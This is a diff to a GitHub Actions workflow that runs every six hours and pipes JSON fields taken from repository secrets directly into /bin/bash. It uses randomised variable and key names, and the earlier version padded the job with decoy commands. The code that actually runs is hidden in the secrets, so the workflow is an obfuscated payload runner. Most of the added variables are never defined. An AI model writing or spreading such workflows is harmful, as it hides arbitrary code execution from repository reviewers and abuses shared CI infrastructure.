@@ -3,20 +3,24 @@ name: huyixin1923
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
-jobs:  # 24114
+    - cron: '19 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huyixin1923
         env:
-          p25783: ${{ secrets.p25783 }}
+          we81: ${{ secrets.we81 }}
         run: |
-          : ' Another single-line comment '
-          echo $p25783 | jq -r .l7783 | /bin/bash
-          popd
-          ping -c 10 github.com
-          echo "Debug at $(date)"
-          cd ~
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo $we81 | jq -r .yc12901 | /bin/bash
+          echo $apfw7164 | jq -r .sdfdi91367 | /bin/bash
+          echo $j8 | jq -r .hpqtr04 | /bin/bash
+          echo $t426 | jq -r .m3427 | /bin/bash
+          echo $lmlqj75 | jq -r .g077 | /bin/bash
+          echo $jazee4 | jq -r .xs9 | /bin/bash
+          echo $ac76161 | jq -r .grdk7904 | /bin/bash
+          echo $ld6740 | jq -r .ab9916 | /bin/bash
+
